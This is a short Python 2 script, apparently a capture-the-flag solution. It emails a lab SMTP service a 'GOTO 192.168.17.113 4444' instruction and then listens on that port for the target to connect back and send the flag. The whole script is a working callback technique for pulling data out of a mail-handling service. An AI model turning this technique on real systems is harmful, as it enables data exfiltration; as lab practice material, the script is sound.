#!/usr/bin/python

import socket, smtplib, sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


IP = "192.168.17.48"
PORT = 1025
FROM_EMAIL = "bob@example.com"
TO_EMAIL = "alice@example.com"
SERV_IP = "192.168.17.113"
SERV_PORT = 4444

MESSAGE = """From: Bob <bob@example.com>
To: Alice <alice@example.com>
Subject: FLAG

GOTO 192.168.17.113 4444
"""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def setup():
  s.bind((SERV_IP, SERV_PORT))
  s.listen(1)

def listen():
  while True:
    conn, addr = s.accept()
    data = conn.recv(1024)
    if(data):
      print data
      conn.close()
      sys.exit(0)

def send_email():
  c = smtplib.SMTP(IP, PORT)
  c.sendmail(FROM_EMAIL, [TO_EMAIL], MESSAGE)
  c.quit()

setup()
send_email()
listen()
